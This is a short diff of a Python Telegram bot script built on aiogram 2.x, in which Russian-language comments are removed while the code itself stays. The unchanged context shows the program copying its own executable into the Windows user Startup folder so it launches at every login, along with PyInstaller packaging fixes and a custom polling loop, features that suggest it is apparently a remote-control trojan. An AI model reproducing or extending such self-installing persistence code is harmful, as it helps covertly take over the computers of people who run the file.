@@ -4,14 +4,13 @@
 #                                           #
 # # # # # # # # # # # # # # # # # # # # # # #
 
-# ---- FIX ДЛЯ PYINSTALLER ---- #
 import sys
 import os
 import asyncio
 
 if getattr(sys, 'frozen', False):
     sys.path.append(sys._MEIPASS)
-# ---- FIX ДЛЯ PYINSTALLER ---- #
+    
 
 # ---- Imports для aiogram 2.x ---- #
 from aiogram import Bot, Dispatcher, types
@@ -40,7 +39,7 @@ user_path = os.path.expanduser('~')
 if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
     os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
 
-# ---- СОЗДАЁМ СВОЙ executor (100% РАБОТАЕТ В .EXE) ---- #
+
 class CustomExecutor:
     @staticmethod
     def start_polling(dp, skip_updates=False, on_startup=None, on_shutdown=None):
@@ -62,7 +61,7 @@ class CustomExecutor:
             loop.close()
 
 executor = CustomExecutor
-# ---- КОНЕЦ FIX ---- #
+
 
 # ---- ХЕНДЛЕРЫ ---- #
 @dp.message_handler(commands=['start'])
